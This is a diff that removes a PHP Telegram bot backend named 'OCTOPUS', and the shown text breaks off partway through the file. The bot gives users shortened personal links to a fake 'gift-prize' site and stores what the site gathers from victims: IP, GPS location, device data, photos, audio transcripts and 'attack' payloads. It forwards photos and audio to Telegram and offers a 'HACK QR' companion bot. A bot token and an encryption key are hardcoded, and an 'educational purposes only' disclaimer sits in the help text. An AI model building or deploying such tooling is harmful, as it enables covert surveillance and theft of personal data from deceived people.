@@ -1,1159 +1,1223 @@
-<?php
-/**
- * OCTOPUS ULTRA PREMIUM – نظام متقدم لجمع البيانات
- * البوت الخلفي الكامل مع SQLite، تشفير AES-256-GCM، تيليجرام، لوحة تحكم
- * 
- * @author DR CODE 😈
- * @version 2.0.0
- */
-
-declare(strict_types=1);
-
-// ========================================================================
-//  الحماية الأساسية
-// ========================================================================
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type');
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    http_response_code(200);
-    exit;
-}
-
-// ========================================================================
-//  الإعدادات الأساسية
-// ========================================================================
-define('BOT_TOKEN', '8510019915:AAG3IhELzZ3WH07Wccr0lxFW74r29CHLfyk');
-define('ADMIN_IDS', [8552540563]);
-define('DEVELOPER_USERNAME', '@XX_8K');
-define('DEVELOPER_LINK', 'https://t.me/xx_8k');
-define('SECOND_BOT_USERNAME', 'x_x_2bot');
-define('SECOND_BOT_LINK', 'https://t.me/x_x_2bot');
-define('SITE_URL', 'https://gift-prize.github.io/ONLINE/');
-define('DB_FILE', __DIR__ . '/bot_data.db');
-define('LOG_FILE', __DIR__ . '/bot.log');
-define('TEMP_DIR', __DIR__ . '/temp/');
-define('TOKEN_LENGTH', 6); // 6 أحرف بالضبط
-define('TOKEN_CHARS', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789');
-define('RATE_LIMIT_MAX_CALLS', 5);
-define('RATE_LIMIT_PERIOD_SECONDS', 10);
-define('MAX_FILE_SIZE', 10 * 1024 * 1024); // 10 ميجابايت
-define('ENCRYPTION_KEY', 'octopus_ultra_premium_2026_secret_key_32'); // 32 حرف لـ AES-256
-
-// ========================================================================
-//  دوال التسجيل (Logging)
-// ========================================================================
-function log_message(string $level, string $msg): void {
-    file_put_contents(LOG_FILE, '[' . date('Y-m-d H:i:s') . "] $level: $msg" . PHP_EOL, FILE_APPEND | LOCK_EX);
-}
-function log_info(string $msg)   { log_message('INFO', $msg); }
-function log_error(string $msg)  { log_message('ERROR', $msg); }
-function log_warning(string $msg) { log_message('WARNING', $msg); }
-function log_debug(string $msg)  { log_message('DEBUG', $msg); }
-function log_array(string $label, array $data): void {
-    log_debug("$label: " . json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
-}
-
-// ========================================================================
-//  دوال التشفير (AES-256-GCM)
-// ========================================================================
-function encryptData(string $data): string {
-    $key = ENCRYPTION_KEY;
-    $iv = random_bytes(12);
-    $cipher = 'aes-256-gcm';
-    $tag = null;
-    $encrypted = openssl_encrypt($data, $cipher, $key, OPENSSL_RAW_DATA, $iv, $tag);
-    if ($encrypted === false) throw new RuntimeException('Encryption failed');
-    return base64_encode($iv . $tag . $encrypted);
-}
-
-function decryptData(string $encoded): string {
-    $key = ENCRYPTION_KEY;
-    $cipher = 'aes-256-gcm';
-    $decoded = base64_decode($encoded);
-    if (strlen($decoded) < 28) throw new RuntimeException('Invalid encrypted data');
-    $iv = substr($decoded, 0, 12);
-    $tag = substr($decoded, 12, 16);
-    $ciphertext = substr($decoded, 28);
-    $decrypted = openssl_decrypt($ciphertext, $cipher, $key, OPENSSL_RAW_DATA, $iv, $tag);
-    if ($decrypted === false) throw new RuntimeException('Decryption failed');
-    return $decrypted;
-}
-
-// ========================================================================
-//  توليد التوكن (6 أحرف فريدة)
-// ========================================================================
-function generateToken(): string {
-    $chars = TOKEN_CHARS;
-    $length = TOKEN_LENGTH;
-    $max = strlen($chars) - 1;
-    $token = '';
-    for ($i = 0; $i < $length; $i++) {
-        $token .= $chars[random_int(0, $max)];
-    }
-    return $token;
-}
-
-function generateUniqueToken(PDO $db): string {
-    $maxAttempts = 100;
-    for ($i = 0; $i < $maxAttempts; $i++) {
-        $token = generateToken();
-        $stmt = $db->prepare("SELECT 1 FROM users WHERE token_hash = ?");
-        $hash = hash('sha256', $token);
-        $stmt->execute([$hash]);
-        if (!$stmt->fetch()) {
-            return $token;
-        }
-    }
-    throw new RuntimeException('Failed to generate unique token after ' . $maxAttempts . ' attempts');
-}
-
-// ========================================================================
-//  فئة قاعدة البيانات (SQLite مع WAL)
-// ========================================================================
-class Database {
-    private PDO $pdo;
-
-    public function __construct() {
-        try {
-            $this->pdo = new PDO("sqlite:" . DB_FILE);
-            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
-            $this->pdo->exec("PRAGMA journal_mode=WAL");
-            $this->pdo->exec("PRAGMA synchronous=NORMAL");
-            $this->migrate();
-        } catch (Throwable $e) {
-            log_error("DB Connection failed: " . $e->getMessage());
-            throw new RuntimeException("Database error: " . $e->getMessage());
-        }
-    }
-
-    private function migrate(): void {
-        // جدول المستخدمين
-        $this->pdo->exec("
-            CREATE TABLE IF NOT EXISTS users (
-                user_id INTEGER PRIMARY KEY,
-                token_hash TEXT UNIQUE NOT NULL,
-                token_encrypted TEXT NOT NULL,
-                fingerprint TEXT,
-                language TEXT DEFAULT 'en',
-                device_data TEXT,
-                ip TEXT,
-                total_submissions INTEGER DEFAULT 0,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ");
-
-        // جدول الإرسالات
-        $this->pdo->exec("
-            CREATE TABLE IF NOT EXISTS submissions (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                token TEXT,
-                ip TEXT,
-                location_lat REAL,
-                location_lng REAL,
-                location_accuracy REAL,
-                location_error TEXT,
-                device_data TEXT,
-                attacks_data TEXT,
-                audio_transcript TEXT,
-                photo_count INTEGER DEFAULT 0,
-                audio_size INTEGER DEFAULT 0,
-                submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                FOREIGN KEY (user_id) REFERENCES users(user_id)
-            )
-        ");
-
-        // جدول الأحداث المشبوهة
-        $this->pdo->exec("
-            CREATE TABLE IF NOT EXISTS suspicious_events (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                token TEXT,
-                action TEXT,
-                ip TEXT,
-                user_agent TEXT,
-                url TEXT,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ");
-
-        // جدول هجمات XSS/CSRF/Session
-        $this->pdo->exec("
-            CREATE TABLE IF NOT EXISTS attack_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                user_id INTEGER,
-                token TEXT,
-                attack_type TEXT,
-                payload TEXT,
-                detected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        ");
-
-        // جدول حد الطلبات
-        $this->pdo->exec("
-            CREATE TABLE IF NOT EXISTS rate_limits (
-                user_id INTEGER,
-                timestamp INTEGER,
-                PRIMARY KEY (user_id, timestamp)
-            )
-        ");
-        $this->pdo->exec("DELETE FROM rate_limits WHERE timestamp < " . (time() - 86400));
-
-        // فهارس
-        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_users_token_hash ON users(token_hash)");
-        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_submissions_user_id ON submissions(user_id)");
-        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_suspicious_user_id ON suspicious_events(user_id)");
-        $this->pdo->exec("CREATE INDEX IF NOT EXISTS idx_attack_user_id ON attack_logs(user_id)");
-
-        log_info("Database migrated successfully with WAL mode");
-    }
-
-    public function execute(string $sql, array $params = []): int {
-        $stmt = $this->pdo->prepare($sql);
-        $stmt->execute($params);
-        return $stmt->rowCount();
-    }
-
-    public function query(string $sql, array $params = []): array {
-        $stmt = $this->pdo->prepare($sql);
-        $stmt->execute($params);
-        return $stmt->fetchAll();
-    }
-
-    public function getPdo(): PDO {
-        return $this->pdo;
-    }
-
-    public function getUserByToken(string $token): ?array {
-        $hash = hash('sha256', $token);
-        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE token_hash = ?");
-        $stmt->execute([$hash]);
-        return $stmt->fetch() ?: null;
-    }
-
-    public function getUserById(int $userId): ?array {
-        $stmt = $this->pdo->prepare("SELECT * FROM users WHERE user_id = ?");
-        $stmt->execute([$userId]);
-        return $stmt->fetch() ?: null;
-    }
-
-    public function createUser(int $userId, string $token, string $fingerprint = null, string $lang = 'en', string $deviceData = null, string $ip = null): void {
-        $hash = hash('sha256', $token);
-        $encrypted = encryptData($token);
-        $stmt = $this->pdo->prepare("
-            INSERT INTO users (user_id, token_hash, token_encrypted, fingerprint, language, device_data, ip)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
-        ");
-        $stmt->execute([$userId, $hash, $encrypted, $fingerprint, $lang, $deviceData, $ip]);
-        log_info("New user created: user_id=$userId, token=$token");
-    }
-
-    public function updateLastUsed(int $userId): void {
-        $stmt = $this->pdo->prepare("UPDATE users SET last_used = CURRENT_TIMESTAMP WHERE user_id = ?");
-        $stmt->execute([$userId]);
-    }
-
-    public function updateLanguage(int $userId, string $lang): void {
-        $stmt = $this->pdo->prepare("UPDATE users SET language = ? WHERE user_id = ?");
-        $stmt->execute([$lang, $userId]);
-    }
-
-    public function incrementSubmissions(int $userId): void {
-        $stmt = $this->pdo->prepare("UPDATE users SET total_submissions = total_submissions + 1 WHERE user_id = ?");
-        $stmt->execute([$userId]);
-    }
-
-    public function countUsers(): int {
-        $stmt = $this->pdo->query("SELECT COUNT(*) as cnt FROM users");
-        return (int) ($stmt->fetch()['cnt'] ?? 0);
-    }
-
-    public function saveSubmission(array $data): int {
-        $stmt = $this->pdo->prepare("
-            INSERT INTO submissions (
-                user_id, token, ip, location_lat, location_lng, location_accuracy,
-                location_error, device_data, attacks_data, audio_transcript,
-                photo_count, audio_size
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ");
-        $stmt->execute([
-            $data['user_id'],
-            $data['token'],
-            $data['ip'],
-            $data['location_lat'],
-            $data['location_lng'],
-            $data['location_accuracy'],
-            $data['location_error'],
-            $data['device_data'],
-            $data['attacks_data'],
-            $data['audio_transcript'] ?? null,
-            $data['photo_count'] ?? 0,
-            $data['audio_size'] ?? 0
-        ]);
-        return (int) $this->pdo->lastInsertId();
-    }
-
-    public function saveSuspiciousEvent(int $userId, string $token, string $action, string $ip, string $userAgent, string $url): void {
-        $stmt = $this->pdo->prepare("
-            INSERT INTO suspicious_events (user_id, token, action, ip, user_agent, url)
-            VALUES (?, ?, ?, ?, ?, ?)
-        ");
-        $stmt->execute([$userId, $token, $action, $ip, $userAgent, $url]);
-    }
-
-    public function saveAttackLog(int $userId, string $token, string $attackType, string $payload): void {
-        $stmt = $this->pdo->prepare("
-            INSERT INTO attack_logs (user_id, token, attack_type, payload)
-            VALUES (?, ?, ?, ?)
-        ");
-        $stmt->execute([$userId, $token, $attackType, $payload]);
-    }
-}
-
-// ========================================================================
-//  فئة Rate Limiter
-// ========================================================================
-class RateLimiter {
-    private Database $db;
-    private int $maxCalls;
-    private int $period;
-
-    public function __construct(Database $db) {
-        $this->db = $db;
-        $this->maxCalls = RATE_LIMIT_MAX_CALLS;
-        $this->period = RATE_LIMIT_PERIOD_SECONDS;
-    }
-
-    public function isAllowed(int $userId): bool {
-        $now = time();
-        $cutoff = $now - $this->period;
-        $this->db->execute("DELETE FROM rate_limits WHERE user_id = ? AND timestamp < ?", [$userId, $cutoff]);
-        $rows = $this->db->query("SELECT COUNT(*) as cnt FROM rate_limits WHERE user_id = ? AND timestamp >= ?", [$userId, $cutoff]);
-        $count = (int) ($rows[0]['cnt'] ?? 0);
-        if ($count >= $this->maxCalls) return false;
-        $this->db->execute("INSERT INTO rate_limits (user_id, timestamp) VALUES (?, ?)", [$userId, $now]);
-        return true;
-    }
-}
-
-// ========================================================================
-//  فئة Telegram Bot
-// ========================================================================
-class TelegramBot {
-    private string $token;
-    private Database $db;
-    private RateLimiter $rateLimiter;
-    private string $apiBase = "https://api.telegram.org/bot";
-    private string $tempDir;
-
-    public function __construct(string $token) {
-        $this->token = $token;
-        $this->db = new Database();
-        $this->rateLimiter = new RateLimiter($this->db);
-        $this->tempDir = TEMP_DIR;
-        if (!is_dir($this->tempDir)) mkdir($this->tempDir, 0755, true);
-    }
-
-    private function callApi(string $method, array $params = [], bool $multipart = false): array {
-        $url = $this->apiBase . $this->token . "/" . $method;
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        if ($multipart) {
-            curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
-        } else {
-            curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
-            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-        }
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-        $response = curl_exec($ch);
-        $err = curl_error($ch);
-        curl_close($ch);
-        if ($err) { log_error("CURL error: $err"); return ['ok' => false, 'description' => $err]; }
-        return json_decode($response, true) ?? ['ok' => false, 'description' => 'Invalid JSON'];
-    }
-
-    public function sendMessage(int $chatId, string $text, ?array $replyMarkup = null, string $parseMode = 'HTML'): void {
-        $params = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => $parseMode];
-        if ($replyMarkup) $params['reply_markup'] = json_encode($replyMarkup);
-        $this->callApi('sendMessage', $params);
-    }
-
-    public function sendPhoto(int $chatId, string $filePath, string $caption = ''): void {
-        if (!file_exists($filePath)) return;
-        $params = ['chat_id' => $chatId, 'photo' => new CURLFile($filePath), 'caption' => $caption, 'parse_mode' => 'HTML'];
-        $this->callApi('sendPhoto', $params, true);
-    }
-
-    public function sendMediaGroup(int $chatId, array $media, array $filePaths): void {
-        if (empty($media)) return;
-        $mediaJson = array_map(fn($m) => ['type' => 'photo', 'media' => $m['media']], $media);
-        $params = ['chat_id' => $chatId, 'media' => json_encode($mediaJson)];
-        foreach ($filePaths as $path) {
-            if (file_exists($path)) $params[basename($path)] = new CURLFile($path);
-        }
-        $this->callApi('sendMediaGroup', $params, true);
-    }
-
-    public function sendAudio(int $chatId, string $filePath, string $caption = ''): void {
-        if (!file_exists($filePath)) return;
-        $params = ['chat_id' => $chatId, 'audio' => new CURLFile($filePath), 'caption' => $caption, 'parse_mode' => 'HTML'];
-        $this->callApi('sendAudio', $params, true);
-    }
-
-    private function deleteTempFiles(array $files): void {
-        foreach ($files as $file) {
-            if (file_exists($file)) @unlink($file);
-        }
-    }
-
-    private function shortenUrl(string $url): string {
-        $ch = curl_init("https://is.gd/create.php?format=simple&url=" . urlencode($url));
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        $response = curl_exec($ch);
-        curl_close($ch);
-        $short = trim($response);
-        if (empty($short) || strpos($short, 'Error') !== false || !filter_var($short, FILTER_VALIDATE_URL)) return $url;
-        return $short;
-    }
-
-    // ====================================================================
-    //  لوحات المفاتيح
-    // ====================================================================
-    private function languageKeyboard(): array {
-        return ['inline_keyboard' => [
-            [['text' => '🇦🇪 عربي', 'callback_data' => 'lang_ar'], ['text' => '🇬🇧 English', 'callback_data' => 'lang_en']]
-        ]];
-    }
-
-    private function mainMenuKeyboard(string $lang): array {
-        if ($lang === 'ar') {
-            return ['inline_keyboard' => [
-                [['text' => '〈 ⎋ رابطــي 〉', 'callback_data' => 'getlink']],
-                [['text' => '〈  ☰  الــدليـل 〉', 'callback_data' => 'help'], ['text' => '〈 ⌗  المـــطور  〉', 'url' => DEVELOPER_LINK]],
-                [['text' => '〈  ⇄  تغـييـر اللـغة 〉', 'callback_data' => 'change_lang']]
-            ]];
-        }
-        return ['inline_keyboard' => [
-            [['text' => '〈 ⎋ ᴍʏ ʟɪɴᴋ 〉', 'callback_data' => 'getlink']],
-            [['text' => '〈  ☰  ɢᴜɪᴅᴇ 〉', 'callback_data' => 'help'], ['text' => '〈 ⌗  ᴅᴇᴠᴇʟᴏᴘᴇʀ 〉', 'url' => DEVELOPER_LINK]],
-            [['text' => '〈  ⇄  ᴄʜᴀɴɢᴇ ʟᴀɴɢᴜᴀɢᴇ 〉', 'callback_data' => 'change_lang']]
-        ]];
-    }
-
-    private function linkKeyboard(string $lang, string $link): array {
-        if ($lang === 'ar') {
-            return ['inline_keyboard' => [
-                [['text' => '〈 ⎋ فتـح رابطــي 〉', 'url' => $link]],
-                [['text' => '〈  ⧉  ʜᴀᴄᴋ ǫʀ 〉', 'url' => SECOND_BOT_LINK]],
-                [['text' => '〈 ⌂  القائمــة الرئيسيــة 〉', 'callback_data' => 'main_menu']]
-            ]];
-        }
-        return ['inline_keyboard' => [
-            [['text' => '〈  ⎋  ᴏᴘᴇɴ ᴍʏ ʟɪɴᴋ 〉', 'url' => $link]],
-            [['text' => '〈  ⧉  ʜᴀᴄᴋ ǫʀ 〉', 'url' => SECOND_BOT_LINK]],
-            [['text' => '〈 ⌂  ᴍᴀɪɴ ᴍᴇɴᴜ 〉', 'callback_data' => 'main_menu']]
-        ]];
-    }
-
-    private function helpKeyboard(string $lang): array {
-        return ['inline_keyboard' => [
-            [['text' => $lang === 'ar' ? '〈 ⏎ عودة للقائمة 〉' : '⏎ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ', 'callback_data' => 'main_menu']]
-        ]];
-    }
-
-    // ====================================================================
-    //  دوال المستخدمين
-    // ====================================================================
-    private function getOrCreateUser(int $userId, string $ip = null, string $lang = null): array {
-        $user = $this->db->getUserById($userId);
-        if ($user) {
-            $this->db->updateLastUsed($userId);
-            // تحديث الـ IP إذا اختلف
-            if ($ip && $user['ip'] !== $ip) {
-                $this->db->execute("UPDATE users SET ip = ? WHERE user_id = ?", [$ip, $userId]);
-            }
-            return $user;
-        }
-        $token = generateUniqueToken($this->db->getPdo());
-        $lang = $lang ?? 'en';
-        $this->db->createUser($userId, $token, null, $lang, null, $ip);
-        return $this->db->getUserById($userId);
-    }
-
-    private function isAdmin(int $userId): bool {
-        return in_array($userId, ADMIN_IDS, true);
-    }
-
-    // ====================================================================
-    //  معالجة الأوامر والكولباك
-    // ====================================================================
-    public function handleUpdate(array $update): void {
-        try {
-            if (isset($update['message'])) $this->handleMessage($update['message']);
-            elseif (isset($update['callback_query'])) $this->handleCallback($update['callback_query']);
-        } catch (Throwable $e) {
-            log_error("Unhandled exception: " . $e->getMessage());
-        }
-    }
-
-    private function handleMessage(array $message): void {
-        $userId = $message['from']['id'] ?? 0;
-        $chatId = $message['chat']['id'] ?? 0;
-        $text = $message['text'] ?? '';
-
-        if (!$this->rateLimiter->isAllowed($userId)) {
-            $this->sendMessage($chatId, "🚫 تــم تَجــاوُزُ الحــدّ الأقــصــى.\n⏳ يُرجــى الانتظــار لحظــة.");
-            return;
-        }
-
-        $user = $this->getOrCreateUser($userId, $_SERVER['REMOTE_ADDR'] ?? null);
-        $lang = $user['language'] ?? 'en';
-
-        if (!empty($text) && $text[0] === '/') {
-            $command = explode(' ', $text)[0];
-            if ($command === '/start') { $this->handleStart($chatId, $lang); return; }
-            if ($command === '/stats' && $this->isAdmin($userId)) { $this->handleStats($chatId, $lang); return; }
-            $this->handleStart($chatId, $lang);
-            return;
-        }
-
-        // أي رسالة غير أمر = إعادة الترحيب
-        $this->handleStart($chatId, $lang);
-    }
-
-    private function handleCallback(array $callback): void {
-        $userId = $callback['from']['id'] ?? 0;
-        $callbackId = $callback['id'] ?? '';
-        $message = $callback['message'] ?? [];
-        $chatId = $message['chat']['id'] ?? 0;
-        $messageId = $message['message_id'] ?? 0;
-        $data = $callback['data'] ?? '';
-
-        if (!$this->rateLimiter->isAllowed($userId)) {
-            $this->answerCallbackQuery($callbackId, "⚠️ تــجــاوُزُ الحــدّ الأقــصــى.\n⏳ يُرجــى الانتظــار لحظــةً.", true);
-            return;
-        }
-
-        $user = $this->getOrCreateUser($userId, $_SERVER['REMOTE_ADDR'] ?? null);
-        $lang = $user['language'] ?? 'en';
-
-        switch ($data) {
-            case 'lang_ar': $this->setLanguage($userId, 'ar', $callback); break;
-            case 'lang_en': $this->setLanguage($userId, 'en', $callback); break;
-            case 'change_lang': $this->callbackChangeLang($callback); break;
-            case 'getlink': $this->callbackGetLink($callback); break;
-            case 'help': $this->callbackHelp($callback); break;
-            case 'main_menu': $this->callbackMainMenu($callback); break;
-            default: $this->answerCallbackQuery($callbackId, "⚠️ هــذا الــزِرّ مُعــطّــل.");
-        }
-    }
-
-    // ====================================================================
-    //  معالجة اللغة
-    // ====================================================================
-    private function setLanguage(int $userId, string $lang, array $callback): void {
-        $this->db->updateLanguage($userId, $lang);
-        $this->answerCallbackQuery($callback['id'], $lang === 'ar' ? "✅ تم اختيار العربية" : "✅ Language set to English");
-        $chatId = $callback['message']['chat']['id'];
-        $messageId = $callback['message']['message_id'];
-        $text = $lang === 'ar' 
-            ? "⭑ اهلا بك في 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n⊚─〔 مـرحـبـا 〕──────────\n˼🫡˹ اهلا بك في 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n˼♥️˹ سعداء بوجودك معنا ⭒\n˼📖˹ يرجى قراءة الدليل ⭒\n˼🚀˹ لنبدأ الرحلة معا ⭒\n─────────────────"
-            : "⭑ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n‌╭⊚─〔 ᴡᴇʟᴄᴏᴍᴇ 〕─────\n┃˹🫡˼ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n┃˹♥️˼ ᴡᴇ'ʀᴇ ɢʟᴀᴅ ᴛᴏ ʜᴀᴠᴇ ʏᴏᴜ  ‌⭒\n┃˹📖˼ ᴘʟᴇᴀꜱᴇ ʀᴇᴀᴅ ᴛʜᴇ ɢᴜɪᴅᴇ  ‌⭒\n┃˹🚀˼ ʟᴇᴛ'ꜱ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ     ‌⭒\n╰───────────────";
-        $this->editMessageText($chatId, $messageId, $text, $this->mainMenuKeyboard($lang));
-    }
-
-    private function callbackChangeLang(array $callback): void {
-        $this->answerCallbackQuery($callback['id']);
-        $chatId = $callback['message']['chat']['id'];
-        $messageId = $callback['message']['message_id'];
-        $this->editMessageText($chatId, $messageId, "🌐 اختر اللغــة / Choose language:", $this->languageKeyboard());
-    }
-
-    // ====================================================================
-    //  الأوامر
-    // ====================================================================
-    private function handleStart(int $chatId, string $lang): void {
-        $text = $lang === 'ar'
-            ? "⭑ اهلا بك في 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n⊚─〔 مـرحـبـا 〕──────────\n˼🫡˹ اهلا بك في 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n˼♥️˹ سعداء بوجودك معنا ⭒\n˼📖˹ يرجى قراءة الدليل ⭒\n˼🚀˹ لنبدأ رحلتنا معا ⭒\n─────────────────"
-            : "⭑ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n‌╭⊚─〔 ᴡᴇʟᴄᴏᴍᴇ 〕─────\n┃˹🫡˼ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ ⭒\n┃˹♥️˼ ᴡᴇ'ʀᴇ ɢʟᴀᴅ ᴛᴏ ʜᴀᴠᴇ ʏᴏᴜ  ‌⭒\n┃˹📖˼ ᴘʟᴇᴀꜱᴇ ʀᴇᴀᴅ ᴛʜᴇ ɢᴜɪᴅᴇ  ‌⭒\n┃˹🚀˼ ʟᴇᴛ'ꜱ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ     ‌⭒\n╰───────────────";
-        $this->sendMessage($chatId, $text, $this->mainMenuKeyboard($lang));
-    }
-
-    private function handleStats(int $chatId, string $lang): void {
-        $total = $this->db->countUsers();
-        if ($lang === 'ar') {
-            $text = "⭑ الاحصائيات ⭒\n─────────────────\n˼👥˹ المستخدمون: $total ⭒\n˼⚙️˹ الاصدار: v2.0.0 ⭒\n˼👨‍💻˹ المطور: " . DEVELOPER_USERNAME . " ⭒\n˼🔥˹ البوت يعمل بنجاح ⭒\n─────────────────";
-        } else {
-            $text = "⭑ ꜱᴛᴀᴛɪꜱᴛɪᴄꜱ ⭒\n‌╭⊚─〔 ʙᴏᴛ ɪɴꜰᴏ 〕─────\n┃˹👥˼ <b>ᴜꜱᴇʀꜱ:</b> $total ⭒\n┃˹⚙️˼ <b>ᴠᴇʀꜱɪᴏɴ:</b> v2.0.0 ⭒\n┃˹👨‍💻˼ <b>ᴅᴇᴠ:</b> " . DEVELOPER_USERNAME . " ⭒\n┃˹🔥˼ <i>ʙᴏᴛ ɪꜱ ʀᴜɴɴɪɴɢ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</i> ⭒\n╰───────────────";
-        }
-        $this->sendMessage($chatId, $text);
-    }
-
-    // ====================================================================
-    //  كولباك
-    // ====================================================================
-    private function callbackGetLink(array $callback): void {
-        $userId = $callback['from']['id'];
-        $chatId = $callback['message']['chat']['id'];
-        $messageId = $callback['message']['message_id'];
-        $callbackId = $callback['id'];
-        $user = $this->getOrCreateUser($userId, $_SERVER['REMOTE_ADDR'] ?? null);
-        $lang = $user['language'] ?? 'en';
-
-        // فك تشفير التوكن
-        $token = decryptData($user['token_encrypted']);
-        $link = SITE_URL . '?i=' . $token;
-        $shortLink = $this->shortenUrl($link);
-
-        if ($lang === 'ar') {
-            $text = "⭑ رابطك الشخصي ⭒\n⊚─〔 الرابط 〕──────────\n˼🔗˹ <b>رابطك الشخصي</b> ⭒\n⍟ <code>$shortLink</code>\n˼🔥˹ <i>استخدمه بحكمة</i> ⭒\n─────────────────\n\n⭑ المطور ⭒\n⊚─〔 تواصل 〕────────\n˼👨‍💻˹ " . DEVELOPER_USERNAME . " ⭒\n─────────────────";
-        } else {
-            $text = "⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n‌╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ <b>ʏᴏᴜʀ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ</b> ⭒\n┃⍟ <code>$shortLink</code>\n┃˹🔥˼ <i>ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ</i> ⭒\n╰───────────────\n\n⭑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒\n‌╭⊚─〔 ᴄᴏɴᴛᴀᴄᴛ 〕─────\n┃˹👨‍💻˼ " . DEVELOPER_USERNAME . " ⭒\n╰───────────────";
-        }
-        $this->editMessageText($chatId, $messageId, $text, $this->linkKeyboard($lang, $shortLink));
-        $this->answerCallbackQuery($callbackId, $lang === 'ar' ? "✅ هــذا هــو رابــطــك الــدائــم !" : "✅ ᴛʜɪꜱ ɪꜱ ʏᴏᴜʀ ᴘᴇʀᴍᴀɴᴇɴᴛ ʟɪɴᴋ !");
-    }
-
-    private function callbackHelp(array $callback): void {
-        $userId = $callback['from']['id'];
-        $chatId = $callback['message']['chat']['id'];
-        $messageId = $callback['message']['message_id'];
-        $callbackId = $callback['id'];
-        $user = $this->getOrCreateUser($userId, $_SERVER['REMOTE_ADDR'] ?? null);
-        $lang = $user['language'] ?? 'en';
-
-        if ($lang === 'ar') {
-            $text = "⭑ الدليل ⭒\n⊚─〔 معلومات 〕────────\n˼✨˹ سهل وبسيط في الاستخدام ⭒\n˼📱˹ الروابط تعمل على جميع الاجهزة ⭒\n˼🔗˹ رابطك دائم ولا ينتهي ⭒\n˼👨‍💻˹ تحتاج مساعدة؟ تواصل مع المطور ⭒\n˼⚠️˹ <b>تنبيه</b> ⭒\n<i>هذا البوت للاغراض التعليمية فقط.\nالمستخدم مسؤول عن اي استخدام خاطئ.</i>\n─────────────────";
-        } else {
-            $text = "⭑ ɢᴜɪᴅᴇ ⭒\n‌╭⊚─〔 ɪɴꜰᴏ 〕───────\n┃˹✨˼ ᴇᴀꜱʏ ᴀɴᴅ ꜱɪᴍᴘʟᴇ ᴛᴏ ᴜꜱᴇ ⭒\n┃˹📱˼ ʟɪɴᴋꜱ ᴡᴏʀᴋ ᴏɴ ᴍᴜʟᴛɪᴘʟᴇ ᴅᴇᴠɪᴄᴇꜱ ⭒\n┃˹🔗˼ ʏᴏᴜʀ ʟɪɴᴋ ɪꜱ ᴘᴇʀᴍᴀɴᴇɴᴛ ⭒\n┃˹👨‍💻˼ ɴᴇᴇᴅ ʜᴇʟᴘ? ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀ ⭒\n┃˹⚠️˼ <b>ᴅɪꜱᴄʟᴀɪᴍᴇʀ</b> ⭒\n┃   <i>ᴛʜɪꜱ ʙᴏᴛ ɪꜱ ꜰᴏʀ\n┃   ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴘᴜʀᴘᴏꜱᴇꜱ\n┃   ᴏɴʟʏ. ᴛʜᴇ ᴜꜱᴇʀ ɪꜱ\n┃   ꜰᴜʟʟʏ ʀᴇꜱᴘᴏɴꜱɪʙʟᴇ\n┃   ꜰᴏʀ ᴀɴʏ ᴍɪꜱᴜꜱᴇ.</i>\n╰───────────────";
-        }
-        $this->editMessageText($chatId, $messageId, $text, $this->helpKeyboard($lang));
